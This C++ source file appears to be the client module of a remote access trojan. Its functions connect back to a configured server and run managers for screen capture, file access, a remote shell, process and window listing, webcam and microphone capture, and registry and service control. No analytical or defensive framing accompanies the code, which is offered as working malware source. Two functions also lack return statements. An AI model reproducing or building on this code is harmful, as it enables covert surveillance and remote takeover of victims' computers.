#include "StdAfx.h"
#include "Common.h"

#include "ScreenManager.h"
#include "FileManager.h"
#include "TalkManager.h"
#include "ShellManager.h"
#include "SystemManager.h"
#include "AudioManager.h"
#include "RegisterManager.h"
#include "ServicesManager.h"
#include "VideoManager.h"

extern
char  g_szServerIP[MAX_PATH];
extern  
unsigned short g_uPort;  


HANDLE _CreateThread (LPSECURITY_ATTRIBUTES  SecurityAttributes,   
					  SIZE_T dwStackSize,                                           
					  LPTHREAD_START_ROUTINE StartAddress,      
					  LPVOID lParam,                                          
					  DWORD  dwCreationFlags,                     
					  LPDWORD ThreadId, bool bInteractive)  
{
	
	
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARG_LIST	ThreadArgList = {0};
	ThreadArgList.StartAddress = StartAddress;
	ThreadArgList.lParam = (void *)lParam;   //IP
	ThreadArgList.bInteractive = bInteractive;       //??
	ThreadArgList.hEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
	hThread = (HANDLE)CreateThread(SecurityAttributes, 
		dwStackSize,(LPTHREAD_START_ROUTINE)ThreadProc, &ThreadArgList, 
		dwCreationFlags, (LPDWORD)ThreadId);	

	WaitForSingleObject(ThreadArgList.hEvent, INFINITE);
	CloseHandle(ThreadArgList.hEvent);
	
	return hThread;

}

DWORD WINAPI ThreadProc(LPVOID lParam)
{
	THREAD_ARG_LIST	ThreadArgList = {0};
	memcpy(&ThreadArgList,lParam,sizeof(THREAD_ARG_LIST));
    SetEvent(ThreadArgList.hEvent);
	
	DWORD dwReturn = ThreadArgList.StartAddress(ThreadArgList.lParam);
	return dwReturn;
}



DWORD WINAPI LoopScreenManager(LPVOID lParam)
{
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	
	CScreenManager	Manager(&ClientObject);
	
	ClientObject.RunEventLoop();
	return 0;
}


DWORD WINAPI LoopFileManager(LPVOID lParam)
{
	
	
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	
	CFileManager	Manager(&ClientObject);
	
	ClientObject.RunEventLoop();
	
	return 0;
}


DWORD WINAPI LoopTalkManager(LPVOID lParam)
{
	
	
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	
	CTalkManager	Manager(&ClientObject);
	
	ClientObject.RunEventLoop();
	
	return 0;
}


DWORD WINAPI LoopShellManager(LPVOID lParam)
{
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	
	CShellManager	Manager(&ClientObject);
	
	ClientObject.RunEventLoop();
	
	return 0;
}




DWORD WINAPI LoopProcessManager(LPVOID lParam)   
{	
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	
	CSystemManager	Manager(&ClientObject,COMMAND_SYSTEM);  //plist wlist
	
	ClientObject.RunEventLoop();
	
	return 0;
}


DWORD WINAPI LoopWindowManager(LPVOID lParam)
{	



	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	
	CSystemManager	Manager(&ClientObject,COMMAND_WSLIST);  //plist wlist
	
	ClientObject.RunEventLoop();

	return 0;
}


DWORD WINAPI LoopVideoManager(LPVOID lParam)
{
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	
	CVideoManager	Manager(&ClientObject);
	
	ClientObject.RunEventLoop();
	
	
	return 0;
}


DWORD WINAPI LoopAudioManager(LPVOID lParam)
{
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	
	CAudioManager	Manager(&ClientObject);
	
	ClientObject.RunEventLoop();


	return 0;
}

DWORD WINAPI LoopRegisterManager(LPVOID lParam)
{
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	
	CRegisterManager	Manager(&ClientObject);
	
	ClientObject.RunEventLoop();

}

DWORD WINAPI LoopServicesManager(LPVOID lParam)
{
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIP,g_uPort))
		return -1;
	CServicesManager	Manager(&ClientObject);
	ClientObject.RunEventLoop();	
}